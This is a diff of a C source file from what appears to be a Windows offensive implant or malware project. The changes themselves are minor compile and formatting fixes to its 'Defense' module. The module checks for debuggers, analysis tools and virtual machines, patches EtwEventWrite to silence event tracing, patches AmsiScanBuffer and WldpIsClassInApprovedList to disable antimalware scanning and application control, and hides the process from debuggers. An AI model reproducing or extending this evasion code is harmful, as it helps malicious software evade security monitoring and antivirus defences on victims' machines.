@@ -16,7 +16,7 @@ typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, P
 static int g_defense_last_error = 0;
 
 /* ------------------------------------------------------------------ */
-/* Vectored Exception Handler — MinGW-compatible __try/__except       */
+/* Vectored Exception Handler – MinGW-compatible __try/__except       */
 /* ------------------------------------------------------------------ */
 static jmp_buf g_seh_jmp;
 static bool   g_seh_armed = false;
@@ -41,8 +41,8 @@ bool DefenseCheckDebugger(void) {
         return false;
     }
 
-    pNtQueryInformationProcess pQuery = 
-        (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+    pNtQueryInformationProcess pQuery =
+        (pNtQueryInformationProcess)(void *)GetProcAddress(hNtdll, "NtQueryInformationProcess");
     if (!pQuery) {
         g_defense_last_error = GetLastError();
         MiseryLog(MISERY_LOG_WARN, "DefenseCheckDebugger: NtQueryInformationProcess not found");
@@ -52,13 +52,13 @@ bool DefenseCheckDebugger(void) {
     DWORD_PTR pbi = 0;
     ULONG len = 0;
     NTSTATUS status = pQuery(GetCurrentProcess(), 0x7, &pbi, sizeof(pbi), &len);
-    
+
     bool is_debugged = (status == 0 && pbi != 0);
     if (is_debugged) {
         MiseryLog(MISERY_LOG_WARN, "DefenseCheckDebugger: Debugger detected!");
         return true;
     }
-    
+
     MiseryLog(MISERY_LOG_INFO, "DefenseCheckDebugger: Environment clean");
     return false;
 }
@@ -92,7 +92,10 @@ bool DefenseDetectAnalysisTools(void) {
         return false;
     }
 
-    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
+    PROCESSENTRY32 pe;
+    memset(&pe, 0, sizeof(pe));
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    
     bool found = false;
     int detection_count = 0;
 
@@ -111,12 +114,12 @@ bool DefenseDetectAnalysisTools(void) {
     }
 
     CloseHandle(hSnap);
-    
+
     if (found) {
         MiseryLog(MISERY_LOG_WARN, "DefenseDetectAnalysisTools: Detected %d analysis tools", detection_count);
         return true;
     }
-    
+
     MiseryLog(MISERY_LOG_INFO, "DefenseDetectAnalysisTools: Environment clean");
     return false;
 }
@@ -134,7 +137,10 @@ bool DefenseDetectVirtualMachine(void) {
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap == INVALID_HANDLE_VALUE) return false;
 
-    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
+    PROCESSENTRY32 pe;
+    memset(&pe, 0, sizeof(pe));
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    
     bool found = false;
 
     if (Process32First(hSnap, &pe)) {
@@ -142,7 +148,7 @@ bool DefenseDetectVirtualMachine(void) {
             char lower_name[256];
             strcpy_s(lower_name, sizeof(lower_name), pe.szExeFile);
             for (int i = 0; lower_name[i]; i++) lower_name[i] = tolower(lower_name[i]);
-            
+
             for (int i = 0; vmProcs[i]; i++) {
                 if (strstr(lower_name, vmProcs[i]) != NULL) {
                     MiseryLog(MISERY_LOG_WARN, "DefenseDetectVirtualMachine: Detected [%s]", pe.szExeFile);
@@ -159,7 +165,7 @@ bool DefenseDetectVirtualMachine(void) {
 }
 
 /* ------------------------------------------------------------------ */
-/* DefensePatchETW  — RET patch on EtwEventWrite                      */
+/* DefensePatchETW  – RET patch on EtwEventWrite                      */
 /* ------------------------------------------------------------------ */
 bool DefensePatchETW(void) {
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
@@ -169,7 +175,7 @@ bool DefensePatchETW(void) {
         return false;
     }
 
-    pEtwEventWrite pEtw = (pEtwEventWrite)GetProcAddress(hNtdll, "EtwEventWrite");
+    pEtwEventWrite pEtw = (pEtwEventWrite)(void *)GetProcAddress(hNtdll, "EtwEventWrite");
     if (!pEtw) {
         g_defense_last_error = GetLastError();
         MiseryLog(MISERY_LOG_WARN, "DefensePatchETW: EtwEventWrite not found");
@@ -203,7 +209,7 @@ bool DefensePatchETW(void) {
         MiseryLog(MISERY_LOG_INFO, "DefensePatchETW: Success");
         return true;
     } else {
-        /* Exception caught — memcpy faulted (shouldn't happen after VirtualProtect) */
+        /* Exception caught – memcpy faulted (shouldn't happen after VirtualProtect) */
         g_seh_armed = false;
         RemoveVectoredExceptionHandler(vehHandle);
         VirtualProtect(pEtw, 1, oldProtect, &oldProtect);
@@ -213,7 +219,7 @@ bool DefensePatchETW(void) {
 }
 
 /* ------------------------------------------------------------------ */
-/* DefensePatchAMSI — xor eax,eax / ret on AmsiScanBuffer             */
+/* DefensePatchAMSI – xor eax,eax / ret on AmsiScanBuffer             */
 /* ------------------------------------------------------------------ */
 bool DefensePatchAMSI(void) {
     HMODULE hAmsi = LoadLibraryA("amsi.dll");
@@ -266,7 +272,7 @@ bool DefensePatchAMSI(void) {
 }
 
 /* ------------------------------------------------------------------ */
-/* DefensePatchWLDP — xor eax,eax / ret on WldpIsClassInApprovedList   */
+/* DefensePatchWLDP – xor eax,eax / ret on WldpIsClassInApprovedList   */
 /* ------------------------------------------------------------------ */
 bool DefensePatchWLDP(void) {
     HMODULE hWldp = GetModuleHandleA("wldp.dll");
@@ -319,19 +325,19 @@ bool DefensePatchWLDP(void) {
 }
 
 /* ------------------------------------------------------------------ */
-/* DefenseHideFromDebugger — ProcessDynamicEHContinuationTarget (0x11) */
+/* DefenseHideFromDebugger – ProcessDynamicEHContinuationTarget (0x11) */
 /* ------------------------------------------------------------------ */
 bool DefenseHideFromDebugger(void) {
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (!hNtdll) return false;
 
-    pNtSetInformationProcess pNtSetInfo = 
-        (pNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
+    pNtSetInformationProcess pNtSetInfo =
+        (pNtSetInformationProcess)(void *)GetProcAddress(hNtdll, "NtSetInformationProcess");
     if (!pNtSetInfo) return false;
 
     DWORD hide = 1;
     NTSTATUS status = pNtSetInfo(GetCurrentProcess(), (PROCESS_INFORMATION_CLASS)0x11, &hide, sizeof(hide));
-    
+
     if (status != 0) {
         MiseryLog(MISERY_LOG_WARN, "DefenseHideFromDebugger: NtSetInformationProcess failed (status: 0x%lX)", status);
         return false;
